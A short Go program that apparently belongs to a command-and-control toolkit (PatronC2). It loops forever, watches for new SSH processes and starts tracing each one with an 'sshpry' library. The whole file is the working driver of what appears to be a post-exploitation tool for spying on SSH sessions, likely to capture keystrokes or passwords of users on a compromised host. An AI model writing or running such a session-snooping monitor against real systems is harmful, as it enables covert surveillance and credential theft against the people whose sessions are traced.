package main

import (
	"fmt"
	"log"
	"time"

	"github.com/PatronC2/sshpry-go/pry"
)

func main() {
	fmt.Println("Monitoring SSH processes...")

	// At program start, capture the existing SSH PIDs
	initialPids, err := pry.GetSSHProcesses()
	if err != nil {
		log.Fatalf("Failed to get initial SSH processes: %v", err)
	}

	// Store them in a map for quick lookup
	seenPids := make(map[int]bool)
	for _, pid := range initialPids {
		seenPids[pid] = true
	}

	for {
		sshPids, err := pry.GetSSHProcesses()
		if err != nil {
			log.Printf("Error fetching SSH processes: %v", err)
			time.Sleep(2 * time.Second)
			continue
		}

		for _, pid := range sshPids {
			if !seenPids[pid] {
				// New PID we haven't seen yet — start tracing
				go pry.StartTracing(pid)
				seenPids[pid] = true // Mark it as seen so we don't start tracing again
			}
		}

		time.Sleep(2 * time.Second)
	}
}
